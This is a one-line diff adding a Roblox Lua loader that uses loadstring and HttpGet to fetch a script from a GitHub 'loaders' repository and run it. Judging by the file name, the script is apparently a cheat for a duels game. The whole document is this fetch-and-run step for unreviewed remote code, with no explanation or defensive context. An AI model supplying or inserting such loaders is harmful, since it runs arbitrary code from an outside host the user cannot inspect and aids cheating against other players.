@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/timebomb-duels-alpha-spam5-rfo329fmhisqni.lua"))()
